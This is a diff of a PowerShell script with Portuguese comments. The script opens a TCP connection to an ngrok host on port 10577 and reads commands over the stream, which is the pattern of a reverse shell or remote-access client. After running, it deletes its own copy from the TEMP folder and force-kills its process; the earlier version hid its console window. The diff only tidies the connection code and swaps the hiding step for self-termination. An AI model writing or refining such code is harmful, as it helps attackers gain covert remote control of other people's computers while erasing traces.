@@ -23,9 +23,7 @@ $ngrokPort = 10577
 # CRIAR TCP CLIENTE
 # -----------------------------
 $client = New-Object System.Net.Sockets.TCPClient
-try {
-    $client.Connect($ngrokHost, $ngrokPort)
-} catch { exit }
+try { $client.Connect($ngrokHost, $ngrokPort) } catch { exit }
 
 $stream = $client.GetStream()
 $reader = New-Object System.IO.StreamReader($stream, [System.Text.Encoding]::UTF8)
@@ -67,13 +65,11 @@ try {
 } catch {}
 
 # -----------------------------
-# APAGAR SCRIPT E ENCERRAR POWERSHELL
+# APAGAR SCRIPT E FECHAR POWERHELL
 # -----------------------------
 Start-Sleep -Seconds 1
 Remove-Item "$env:TEMP\scriptngrok.ps1" -ErrorAction SilentlyContinue
-$hwnd = [WinAPI]::GetConsoleWindow()
-[WinAPI]::ShowWindow($hwnd, 0)  # 0 = fechar/ocultar
-exit
+Stop-Process -Id $PID -Force
 
 
 
